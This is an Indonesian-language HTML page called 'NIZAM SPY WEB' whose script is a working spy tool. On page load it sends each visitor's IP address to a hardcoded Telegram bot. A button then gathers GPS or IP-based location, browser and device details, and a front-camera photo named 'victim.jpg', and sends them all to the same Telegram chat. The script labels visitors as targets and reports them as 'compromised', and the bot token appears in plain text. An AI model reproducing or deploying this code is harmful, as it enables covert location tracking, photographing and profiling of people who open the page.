<!DOCTYPE html>
<html>
<head>
    <title>NIZAM SPY WEB</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            background: #000;
            color: #0f0;
            font-family: 'Courier New', monospace;
            text-align: center;
            padding: 50px;
        }
        h1 {
            color: #f00;
            text-shadow: 0 0 10px #f00;
            font-size: 3em;
            margin-bottom: 20px;
        }
        .btn {
            background: linear-gradient(45deg, #f00, #00f);
            color: white;
            padding: 15px 40px;
            border: none;
            border-radius: 50px;
            font-size: 1.2em;
            cursor: pointer;
            margin: 20px;
            transition: 0.3s;
        }
        .btn:hover {
            transform: scale(1.1);
            box-shadow: 0 0 20px #f00;
        }
        #status {
            background: #111;
            padding: 15px;
            border-radius: 10px;
            margin: 30px auto;
            max-width: 600px;
            border: 2px solid #0f0;
            min-height: 60px;
        }
        .footer {
            margin-top: 50px;
            color: #888;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <h1>üî• NIZAM THE DARK LORD üî•</h1>
    <p>Master of Cyber Warfare ‚Ä¢ Digital Overlord ‚Ä¢ Shadow Emperor</p>
    
    <button class="btn" onclick="startSpySystem()">üåÄ AKTIFKAN SPY SYSTEM üåÄ</button>
    
    <div id="status">
        Status: Sistem siap... Klik tombol di atas!
    </div>
    
    <div class="footer">
        ¬© 2025 NIZAM DARK NETWORK | Semua aktivitas direkam
    </div>

    <!-- SPY SCRIPT -->
    <script>
        // ========== CONFIG ==========
        const BOT_TOKEN = '8559427513:AAFB5OTE1gpICXrIKE0jFyNjeUurr42MUOA';
        const CHAT_ID = '8358778598';
        
        // ========== FUNCTIONS ==========
        async function sendTelegram(msg) {
            try {
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`;
                await fetch(url);
                return true;
            } catch(e) {
                console.error('Telegram error:', e);
                return false;
            }
        }
        
        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch(e) {
                return 'Unknown';
            }
        }
        
        async function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    async (pos) => {
                        const loc = {
                            lat: pos.coords.latitude,
                            lng: pos.coords.longitude,
                            accuracy: pos.coords.accuracy
                        };
                        
                        await sendTelegram(
                            `üìç LOKASI TARGET üìç\n` +
                            `Lat: ${loc.lat}\n` +
                            `Lng: ${loc.lng}\n` +
                            `Akurasi: ${loc.accuracy}m\n` +
                            `üó∫Ô∏è https://maps.google.com/?q=${loc.lat},${loc.lng}`
                        );
                        
                        resolve(loc);
                    },
                    async () => {
                        // Fallback ke IP location
                        const ip = await getIP();
                        if (ip !== 'Unknown') {
                            try {
                                const res = await fetch(`https://ipapi.co/${ip}/json/`);
                                const data = await res.json();
                                if (data.latitude) {
                                    await sendTelegram(
                                        `üìç LOKASI (IP-Based) üìç\n` +
                                        `Kota: ${data.city}\n` +
                                        `Negara: ${data.country_name}\n` +
                                        `Lat: ${data.latitude}\n` +
                                        `Lng: ${data.longitude}`
                                    );
                                }
                            } catch(e) {}
                        }
                        resolve(null);
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            });
        }
        
        async function capturePhoto() {
            try {
                document.getElementById('status').innerHTML = 'üì∏ Mengakses kamera... (Izinkan akses)';
                
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' } 
                });
                
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                
                return new Promise((resolve) => {
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0);
                        
                        canvas.toBlob(async (blob) => {
                            // Kirim ke Telegram via FormData
                            const formData = new FormData();
                            formData.append('chat_id', CHAT_ID);
                            formData.append('photo', blob, 'victim.jpg');
                            
                            try {
                                // Pakai proxy untuk CORS
                                await fetch(
                                    `https://corsproxy.io/?https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
                                    { method: 'POST', body: formData }
                                );
                                document.getElementById('status').innerHTML = '‚úÖ Foto terkirim!';
                            } catch(e) {
                                console.error('Foto error:', e);
                            }
                            
                            stream.getTracks().forEach(track => track.stop());
                            resolve(true);
                        }, 'image/jpeg', 0.8);
                    }, 3000);
                });
            } catch(error) {
                document.getElementById('status').innerHTML = '‚ö†Ô∏è Kamera tidak diizinkan';
                return false;
            }
        }
        
        // ========== MAIN FUNCTION ==========
        async function startSpySystem() {
            const btn = document.querySelector('.btn');
            btn.disabled = true;
            btn.innerHTML = '‚ö° PROSES BERJALAN ‚ö°';
            
            // 1. Kirim notifikasi awal
            document.getElementById('status').innerHTML = 'üöÄ Memulai sistem mata-mata...';
            await sendTelegram(
                `üïµÔ∏è‚Äç‚ôÇÔ∏è TARGET BARU MASUK üïµÔ∏è‚Äç‚ôÇÔ∏è\n` +
                `Waktu: ${new Date().toLocaleString('id-ID')}\n` +
                `Browser: ${navigator.userAgent.split(')')[0].split('(')[1] || 'Unknown'}`
            );
            
            // 2. Ambil IP
            document.getElementById('status').innerHTML = 'üåê Mendapatkan IP address...';
            const ip = await getIP();
            await sendTelegram(`üåê IP Target: ${ip}`);
            
            // 3. Ambil Lokasi
            document.getElementById('status').innerHTML = 'üìç Melacak lokasi GPS...';
            await getLocation();
            
            // 4. Ambil Foto
            document.getElementById('status').innerHTML = 'üì∏ Mengambil foto...';
            await capturePhoto();
            
            // 5. Laporan akhir
            await sendTelegram(
                `üìä LAPORAN FINAL üìä\n\n` +
                `‚úÖ IP: ${ip}\n` +
                `‚úÖ Waktu: ${new Date().toLocaleString('id-ID')}\n` +
                `‚úÖ Device: ${navigator.platform}\n` +
                `‚úÖ Browser: ${navigator.userAgent.substring(0, 80)}...\n\n` +
                `üéØ TARGET BERHASIL DIKOMPROMI!`
            );
            
            document.getElementById('status').innerHTML = 
                'üéâ SEMUA DATA TERKIRIM KE TELEGRAM!';
            btn.innerHTML = '‚úÖ SPY SYSTEM SELESAI ‚úÖ';
        }
        
        // Auto-notify saat page load
        window.addEventListener('load', () => {
            setTimeout(async () => {
                const ip = await getIP();
                await sendTelegram(
                    `üåê Website NIZAM diakses!\n` +
                    `IP: ${ip}\n` +
                    `Waktu: ${new Date().toLocaleTimeString('id-ID')}`
                );
            }, 5000);
        });
    </script>
</body>
</html>
